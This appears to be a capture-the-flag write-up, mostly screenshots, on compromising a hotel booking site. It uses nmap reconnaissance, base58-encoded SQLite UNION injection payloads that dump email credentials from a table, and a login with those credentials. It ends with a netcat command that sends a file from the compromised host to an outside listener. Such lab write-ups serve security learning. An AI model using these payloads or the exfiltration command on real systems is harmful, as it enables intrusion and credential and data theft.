<img width="1440" height="309" alt="image" src="https://github.com/user-attachments/assets/79fbb92f-da37-4e73-b622-08f9b09d0ba2" />

<h2> Reconnaissance </h2>

Performing nmap on all ports with service detections and common nmap scripts

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/f751cca6-962a-4b7b-a117-559099622d1c" />

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/c7f82072-5b44-4e22-b47b-7bfd727818ca" />

Both ports are two common web pages
One is a login portal and another one is the hotel booking site

We started analysing the contents of the webpage using curl

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/e2ee1577-f7a6-4fc4-8584-449a3343b54e" />

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/73cc0996-0ef3-4e08-89e1-7f4b02c31caf" />

<img width="1209" height="256" alt="image" src="https://github.com/user-attachments/assets/0568ee77-2454-4e83-be6d-94ffb2939657" />

The site checks the availability and allocates the room ,the value on our booking key might be interesting 

<img width="901" height="81" alt="image" src="https://github.com/user-attachments/assets/b9166497-0bd3-4dd2-81f5-766cd0680d91" />

When you put in cyber chef ,it autodetects that it is a base 58 encoding 

Try sql injection on the parameter ,the famous payload returns bad request
' OR 1=1 -- -

Then we tried the order by paramter to detect the number of columns on the table(enocde every payload on base 58)
booking_id:1' order by 1 -- -

After 2 columns it started returning bad request 
<img width="1051" height="314" alt="image" src="https://github.com/user-attachments/assets/0775a5ef-5702-4810-8b63-72ffc8c03265" />

So,there must be two columns ,now we want to identify the version of the sql or sqlite

booking_id:1' UNION SELECT 1,2 -- -

<img width="1092" height="76" alt="image" src="https://github.com/user-attachments/assets/77a9d1e9-5142-4f5c-a000-02c13e01bf5d" />

SQL Injection confirmed 
Lets enumerate software ,version and tables

booking_id:1' UNION SELECT 1,sqlite_version() -- -
<img width="1291" height="86" alt="image" src="https://github.com/user-attachments/assets/3fac35cc-fdf8-4e09-bafd-00a2e3d97b71" />
Therefore SQLlite

Now lets use PayloadAllTheThings repo to gain details aboyt columns

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-injection

booking_id:1' UNION SELECT 1,sql FROM sqlite_schema -- -
<img width="1346" height="75" alt="image" src="https://github.com/user-attachments/assets/c661c893-91e1-4bac-bfec-f9fb44b3f524" />

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/87e702da-55a5-4ed8-88d1-7ab1e6ccf3de" />

We found a username and password
booking_id:1' UNION SELECT group_concat(email_username),group_concat(email_password) FROM email_access -- -

<img width="1440" height="99" alt="image" src="https://github.com/user-attachments/assets/f0a63d09-9e5f-4818-bf89-46c9a31234c5" />

You can also use sqlmap to automate the process but you need a python script for base58 encoding and a __init__.py 
choose union based sqli with level 5 for complex queries

<img width="886" height="302" alt="image" src="https://github.com/user-attachments/assets/f1ddd39a-0d60-4ce6-954e-77c253690614" />


<img width="771" height="239" alt="image" src="https://github.com/user-attachments/assets/9d2c77d9-09d4-49e3-b2ed-206b8177162c" />


Now let's use it on the login portal on 443

Logged in

You'll get the first flag there

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/0139efe7-e702-4cd7-86db-b88ca3b8d5f2" />

<img width="529" height="89" alt="image" src="https://github.com/user-attachments/assets/7d79aa65-8ed4-47cc-874f-304fbd37d48c" />

<img width="851" height="178" alt="image" src="https://github.com/user-attachments/assets/8160b967-045c-4c3f-b777-4363898ee523" />

<img width="724" height="445" alt="image" src="https://github.com/user-attachments/assets/8c99eaa4-e64f-4780-86fc-993b42f9e9f4" />

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/b17a2c80-2976-4c77-a986-62e1fe3eefba" />

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/16ac9787-1964-43c7-9ecf-ce1c269cb949" />

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/38efaa8a-12ac-4178-a700-5bc4a746a015" />

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/170852f8-93d4-4d42-8ec0-328f78ef3d52" />

sandra@tonhotel:~/Pictures$ nc -w 3 192.168.136.37 443 < boss.jpg

nc -l -p 443 > boss.jpg  

<img width="1439" height="494" alt="image" src="https://github.com/user-attachments/assets/2169aa0c-ba10-45c0-ada0-42413a7c8b6c" />

<img width="1097" height="419" alt="image" src="https://github.com/user-attachments/assets/a5c1302b-e90f-4a47-abe4-8284ec256587" />

<img width="1063" height="274" alt="image" src="https://github.com/user-attachments/assets/96c1c5eb-a24b-434f-82fc-0e9b6883c9e0" />

<img width="1096" height="175" alt="image" src="https://github.com/user-attachments/assets/cac9df2c-7610-4de3-ace5-dd2d323a3016" />

<img width="1009" height="180" alt="image" src="https://github.com/user-attachments/assets/d63bd4d9-18e6-4b34-a9cc-495b11d13909" />

<img width="1028" height="555" alt="image" src="https://github.com/user-attachments/assets/320b0305-1498-4329-9d9e-f3c87dafe21c" />

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/4408063a-3eab-4046-b529-c5d7c863648d" />

<img width="1440" height="900" alt="image" src="https://github.com/user-attachments/assets/edbcd0d9-1cce-4618-953e-769bae5c6f23" />

